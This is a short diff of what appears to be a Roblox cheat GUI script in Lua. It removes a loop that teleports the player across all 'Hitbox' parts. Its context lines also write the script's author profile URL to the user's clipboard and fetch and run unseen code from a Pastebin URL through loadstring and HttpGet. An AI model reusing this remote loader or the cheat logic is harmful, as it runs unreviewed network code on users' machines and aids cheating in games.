@@ -2516,25 +2516,6 @@ PoolTP_Button.MouseButton1Click:Connect(function()
     TeleportTO(309, 2051, -2219,"pos","safe")
 end)
 
-    -- ambil semua Hitbox
-    local hitboxes = {}
-    for _, obj in pairs(workspace:GetChildren()) do
-        if obj:IsA("Part") and obj.Name == "Hitbox" then
-            table.insert(hitboxes, obj)
-        end
-    end
-
-    -- teleport satu per satu
-    for _, hitbox in ipairs(hitboxes) do
-        if hitbox and hitbox.Parent then
-            hrp.CFrame = hitbox.CFrame + Vector3.new(0, 5, 0) -- muncul 5 stud di atas part
-            wait(0.3) -- jeda supaya sempat "tersentuh"
-        end
-    end
-
-    print("Semua Hitbox selesai dikunjungi!")
-end)
-
 CMDBar.FocusLost:Connect(function()
 	command = CMDBar.Text
 	Players:Chat(command)
@@ -3614,6 +3595,7 @@ SendNotify("WARNING!","Gui developed by Fin - My Roblox profil in your clipboard
 SendNotify("GreedyBoy","☘️Iam so sad :/☘️",10)
 setclipboard("https://www.roblox.com/id/users/6650256/profile")
 loadstring(game:HttpGet("https://pastebin.com/raw/0mgKxRTu"))() -- load the premium
+
 
 
 
